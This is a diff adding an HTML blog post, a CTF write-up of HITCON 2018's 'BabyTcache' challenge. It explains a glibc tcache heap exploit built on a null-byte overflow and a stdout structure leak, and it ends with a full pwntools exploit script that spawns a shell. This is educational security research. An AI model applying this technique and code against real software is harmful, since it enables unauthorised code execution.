@@ -1,0 +1,539 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>BabyTcache - HITCON CTF 2018 - slashb4sh</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="slashb4sh" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/babytcache/" />
+    <meta property="og:title" content="BabyTcache - HITCON CTF 2018" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@twitter.com/slashb4sh">
+    
+
+    <meta property="twitter:title" content="BabyTcache - HITCON CTF 2018" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/babytcache/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="slashb4sh" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        slashb4sh
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        BabyTcache - HITCON CTF 2018
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Mon Jan 14 2019 13:00:00 UTC'>
+                            January 14, 2019
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            7 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/ctf">CTF</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/writeup">Writeup</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/pwn">Pwn</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>Linux GLIBC Heap Exploitation of a null-byte overflow</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$$$$$$$$$$$$$$$$$$$$$$$$$$$
+🍊      Baby Tcache      🍊
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$   1. New heap           $
+$   2. Delete heap        $
+$   3. Exit               $
+$$$$$$$$$$$$$$$$$$$$$$$$$$$
+Your choice: $
+</code></pre></div><p>There are two functionalities, create a new chunk and free chunk created. The chunks created are stored as an array in bss. You can create 10 chunks at max.</p>
+<h3 id="mitigations">Mitigations</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+</code></pre></div><h3 id="the-vulnerability">The vulnerability</h3>
+<p>There is a <strong>null byte overflow</strong> when you create a new chunk.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">// IDA decompilation
+</span><span style="color:#75715e"></span>printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Size:</span><span style="color:#e6db74">&#34;</span>);
+size <span style="color:#f92672">=</span> get_int();
+<span style="color:#66d9ef">if</span> ( size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x2000</span> )
+	exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);
+ptr <span style="color:#f92672">=</span> malloc(size);
+<span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>ptr )
+	exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Data:</span><span style="color:#e6db74">&#34;</span>);
+get_inp(ptr, size);
+ptr[size] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;    <span style="color:#75715e">// null byte overflow
+</span><span style="color:#75715e"></span>arr[i] <span style="color:#f92672">=</span> ptr;
+v0 <span style="color:#f92672">=</span> sizes;
+sizes[i] <span style="color:#f92672">=</span> size;
+<span style="color:#66d9ef">return</span> v0;
+</code></pre></div><p>If the size of the chunk to be allocated is given as 0x108, ptr[0x108] will overwrite the last byte of the size of the next chunk.</p>
+<h3 id="exploit">Exploit</h3>
+<h4 id="getting-uaf-on-a-tcache-chunk-that-already-has-a-libc-pointer-to-do-a-partial-overwrite">Getting UAF on a tcache chunk, that already has a libc pointer to do a partial overwrite.</h4>
+<p>We use House of Einhejar techniques for this part of the exploit a get a chunk such that it is present in the tcache bin and the unsorted bin.</p>
+<p>With tcache enabled in glibc 2.27, all chunks of size &lt; 0x410 are put into tcache bins for performance improvements. These are some things to note about tcache chunks:</p>
+<ul>
+<li>There is a tcache bin for each size which can hold 7 chunks in a singly linked list. Furthur freed chunks are put into fastbins as done in the previous glibc versions.</li>
+<li>Tcache chunks, like fastbin chunks are not merged with previously freed chunks when the prev_inuse bit is clear.</li>
+<li>There are no security checks done when a chunk is allocated from the tcache bin. Chunks get allocated from a particular bin if the size field is wrong or even if null.</li>
+</ul>
+<p>Keeping all these things in mind let&rsquo;s move on.
+I allocated a few chunks in the below manner. Each allocation has it purpose.</p>
+<pre><code>      +------------------------------------------------------------+
+      | 0x555555757250:	0x0000000000000000	0x0000000000000501 |
+ptr_0 + 0x555555757260:	0x6161616161616161	0x0000000000000000 +---&gt; To be merged with ptr_4 
+      | 0x555555757270:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+      | 0x555555757750:	0x0000000000000000	0x0000000000000071 |
+ptr_1 + 0x555555757760:	0x6262626262626262	0x0000000000000000 +---&gt; UAF after House of Einhejar
+      | 0x555555757770:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+      | 0x5555557577c0:	0x0000000000000000	0x0000000000000041 |
+ptr_2 + 0x5555557577d0:	0x6161616161616161	0x0000000000000000 +---&gt; Intermediate chunk to get 2 UAFs
+      | 0x5555557577e0:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+      | 0x555555757800:	0x0000000000000000	0x0000000000000021 |
+ptr_3|  0x555555757810:	0x6161616161616161	0x0000000000000000 +---&gt; Overwrite ptr_4-&gt;size 
+      | 0x555555757820:	0x0000000000000000	0x0000000000000501 |
+      +------------------------------------------------------------+
+      | 0x555555757820:	0x0000000000000000	0x0000000000000501 |
+ptr_4 + 0x555555757830:	0x6262626262626262	0x0000000000000000 +---&gt; Einhejar on this chunk
+      | 0x555555757840:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+      | 0x555555757d20:	0x0000000000000000	0x0000000000000021 |
+ptr_5 + 0x555555757d30:	0x6161616161616161	0x0000000000000000 +---&gt; Prevent merge with top chunk
+      | 0x555555757d40:	0x0000000000000000	0x00000000000202e1 |
+      +------------------------------------------------------------+
+</code></pre><p>Note that we clear the prev_inuse bit of next chunk only when the size is a multiple of 0x8. 
+First step is to free and allocate the <code>ptr_3</code> chunk to clear the prev_inuse bit and set the prev_size of the <code>ptr_4</code> chunk.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">      +------------------------------------------------------------+
+      | 0x555555757800:	0x0000000000000000	0x0000000000000021 |
+ptr_3 + 0x555555757810:	0x6161616161616161	0x0000000000000000 +---&gt; Used to overwrite the ptr_4-&gt;size
+      | 0x555555757820:	0x0000000000000000	0x0000000000000501 |
+      +------------------------------------------------------------+
+      | 0x555555757820:	0x00000000000005d0	0x0000000000000500 |
+ptr_4 + 0x555555757830:	0x6262626262626262	0x0000000000000000 +---&gt; ptr_4 - ptr_4-&gt;prev_size <span style="color:#f92672">=</span> ptr_1
+      | 0x555555757840:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+</code></pre></div><ul>
+<li>Free <code>ptr_0</code>, this chunk will now be in the unsorted bin.</li>
+<li>Free <code>ptr_4</code>, since the prev_inuse bit is clear, it will refer to the prev_size and merge with that chunk.</li>
+<li>Now <code>ptr_0</code> is an unsorted bin chunk of 0xad1 size and overlaps <code>ptr_1</code>, <code>ptr_2</code> and <code>ptr_3</code>.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">      +------------------------------------------------------------+
+      | 0x555555757250:	0x0000000000000000	0x0000000000000ad1 |
+ptr_0 + 0x555555757260:	0x6161616161616161	0x0000000000000000 +---&gt; After house of einhejar
+      | 0x555555757270:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+</code></pre></div><ul>
+<li>Free <code>ptr_1</code> and <code>ptr_3</code>, puting them in the tcache bin.</li>
+<li>Allocate 0x4f0, this allocation will be made off unsorted bin. Now <code>ptr_1</code> is in tcache and in unsorted bin.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">      +------------------------------------------------------------+
+      | 0x555555757250:	0x0000000000000000	0x0000000000000501 |
+ptr_0 + 0x555555757260:	0x6161616161616161	0x0000000000000000 +---&gt; Sliced from unsorted bin 
+      | 0x555555757270:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+      | 0x555555757750:	0x0000000000000500	0x00000000000005b1 |
+ptr_1 + 0x555555757760:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 +---&gt; In tcache and unsorted bin
+      | 0x555555757770:	0x0000000000000000	0x0000000000000000 |
+      +------------------------------------------------------------+
+</code></pre></div><ul>
+<li>Allocate a chunk of 0x90, which will be sliced from the unsorted bin. The same pointer is in the tcache as a 0x70 chunk.</li>
+<li>Write to the 0x90 chunk to overwrite the fd of <code>ptr_1</code> to corrupt the tcache bin.</li>
+<li>Allocate 0x60 twice to get the 0x70 chunks from the tcache, the second chunk will be the arbitary chunk.</li>
+</ul>
+<p>With all mitigations enabled, there is nothing we can do other than partially overwrite the libc address. The last three nibbles in libc address is constant. ASLR randomizes the next three nibbles from the last.
+During the CTF we solved this challenge by doing a 16 bit bruteforce to allocate <code>__free_hook</code> and overwrite it with <code>one_gadget</code> to get shell.</p>
+<p>The indented solution involed a very interesting file structure exploitation technique to get libc leak. <a href="https://twitter.com/sherl0ck__">sherl0ck</a> has already made a detailed <a href="https://vigneshsrao.github.io/babytcache/">writeup</a> on the technique.
+It involved overwriting the <code>stdout-&gt;_flags</code> and partially overwriting the <code>_IO_write_base</code>.</p>
+<p>Buffering is enabled in the binary using setvbuf(), The idea is to partially overwrite <code>_IO_write_base</code> so that and we get a leak. The most important part is knowing how <code>stdout-&gt;_flags</code> is to be set. Simply overwriting the <code>_IO_write_base</code> results in a segmentation fault. puts() calls <code>_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</code> which basically checks how much space is left in the buffer and then calls <code>new_do_write (f, s, do_write)</code> where <code>s</code> is data and <code>do_write</code> is the size. Then <code>_IO_SYSWRITE (fp, data, to_do);</code> is called which is more like <code>write(stdout,stdout-&gt;_IO_write_base,size)</code>. There are a number of checks with <code>_flags</code> in the program flow that needs to be passed for successful leaking.</p>
+<p><code>stdout-&gt;_flags</code> is mainly divided into two parts, <code>0xfbad</code> the magic number occupies higher 16 bits and other 16 bits are the flags, to know more look at the <a href="https://github.com/lattera/glibc/blob/master/libio/libio.h">libio.h</a>.
+We have to clear <code>_IO_NO_WRITES</code>, if set, writing is not allowed and results in an EOF error. <code>_IO_CURRENTLY_PUTTING</code> and <code>_IO_IS_APPENDING</code> have to be set to avoid any furthur issues within puts(). To know more refer <a href="https://vigneshsrao.github.io/babytcache/">sherl0ck&rsquo;s writeup</a>.</p>
+<p>Partially overwrite last two bytes of unsorted bin libc address with <code>stdout</code>. Set <code>stdout-&gt;_flags</code> as <code>0xfbad1800</code> and partially overwrite the <code>stdout-&gt;_IO_write_base</code> to a lower address such that libc addresses are flushed out. There is a 4-bit bruteforce involved to land the <code>stdout</code> address.</p>
+<p>After getting the leak you just have to corrupt tcache again and overwrite <code>__free_hook</code> with <code>one\_gadget</code>. For this we apply the same technique for UAF on <code>ptr_2</code> by allocated a chunk off the unsorted bin.</p>
+<h3 id="here-is-my-exploit-code">Here is my exploit code</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+s<span style="color:#f92672">=</span>process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./baby_tcache</span><span style="color:#e6db74">&#34;</span>,env<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">LD_PRELOAD</span><span style="color:#e6db74">&#39;</span> : <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#39;</span>})
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#75715e">#s=remote(&#34;52.68.236.186&#34;, 56746)</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size,data,val<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
+        s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice: </span><span style="color:#e6db74">&#34;</span>)
+        s<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">1</span>))
+        s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Size:</span><span style="color:#e6db74">&#34;</span>)
+        s<span style="color:#f92672">.</span>sendline(str(size))
+        ret <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Data:</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+        <span style="color:#66d9ef">if</span> ret <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>:
+            exit()
+        <span style="color:#66d9ef">if</span>(val):
+            s<span style="color:#f92672">.</span>sendline(str(data))
+        <span style="color:#66d9ef">else</span>:
+            s<span style="color:#f92672">.</span>send(str(data))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
+        s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your choice: </span><span style="color:#e6db74">&#34;</span>)
+        s<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">2</span>))
+        s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Index:</span><span style="color:#e6db74">&#34;</span>)
+        s<span style="color:#f92672">.</span>sendline(str(idx))
+
+<span style="color:#75715e"># House of einhejar</span>
+add(<span style="color:#ae81ff">0x4f0</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">1</span>)
+add(<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+add(<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+add(<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+add(<span style="color:#ae81ff">0x4f0</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0</span>)
+add(<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+
+<span style="color:#75715e"># free and allocate ptr_3 to overwrite prev_size and clear prev\_inuse bit of ptr_4</span>
+free(<span style="color:#ae81ff">3</span>)
+add(<span style="color:#ae81ff">0x18</span>,p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x5d0</span>),<span style="color:#ae81ff">0</span>)
+
+<span style="color:#75715e"># trigger house of einhejar</span>
+free(<span style="color:#ae81ff">0</span>)
+free(<span style="color:#ae81ff">4</span>)
+
+<span style="color:#75715e"># free two ptr_1 and ptr_3 so they can be used to corrupt tcache and get arbitary allocations</span>
+free(<span style="color:#ae81ff">1</span>)
+free(<span style="color:#ae81ff">3</span>)
+
+<span style="color:#75715e"># allocate ptr_1 to get UAF on ptr_1</span>
+add(<span style="color:#ae81ff">0x4f0</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># partial overwrite to stdout-&gt;_flags</span>
+add(<span style="color:#ae81ff">0x90</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0</span>)
+
+<span style="color:#75715e"># Overwrite _flags and _IO_write_base to get leak</span>
+add(<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#34;</span>)
+add(<span style="color:#ae81ff">0x60</span>,p64(<span style="color:#ae81ff">0xfbad1800</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x00</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">1</span>)
+libc_leak<span style="color:#f92672">=</span>u64(s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x3ebff0</span>
+log<span style="color:#f92672">.</span>info(hex(libc_leak))
+free_hook<span style="color:#f92672">=</span>libc_leak <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__free_hook</span><span style="color:#e6db74">&#39;</span>]
+system<span style="color:#f92672">=</span>libc_leak <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]
+one_gadget <span style="color:#f92672">=</span> libc_leak<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4f322</span>
+
+<span style="color:#75715e"># Allocate another size such that it is serviced from the unsorted bin to get UAF on ptr_3</span>
+<span style="color:#75715e"># Corrupt fd with __free_hook, allocate and overwrite with one_gadget</span>
+add(<span style="color:#ae81ff">0x400</span>,p64(<span style="color:#ae81ff">0x00</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span>p64(free_hook))
+add(<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>)
+add(<span style="color:#ae81ff">0x10</span>,p64(one_gadget),<span style="color:#ae81ff">1</span>)
+free(<span style="color:#ae81ff">0</span>)
+
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#mitigations">Mitigations</a></li>
+        <li><a href="#the-vulnerability">The vulnerability</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+        <li><a href="#here-is-my-exploit-code">Here is my exploit code</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-left">
+                                            <a href="/blog/sleepyholder/">
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M145.188,238.575l215.5-215.5c5.3-5.3,5.3-13.8,0-19.1s-13.8-5.3-19.1,0l-225.1,225.1c-5.3,5.3-5.3,13.8,0,19.1l225.1,225 c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4c5.3-5.3,5.3-13.8,0-19.1L145.188,238.575z" />
+    </svg>
+</span>
+
+                                                <span class="text">SleepyHolder - HITCON CTF 2016</span>
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-right">
+                                            <a href="/blog/bartender/">
+                                                <span class="text">bartender - InCTF Internationals 2019</span>
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M360.731,229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1,0s-5.3,13.8,0,19.1l215.5,215.5l-215.5,215.5 c-5.3,5.3-5.3,13.8,0,19.1c2.6,2.6,6.1,4,9.5,4c3.4,0,6.9-1.3,9.5-4l225.1-225.1C365.931,242.875,365.931,234.275,360.731,229.075z" />
+    </svg>
+</span>
+
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/twitter.com/slashb4sh"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
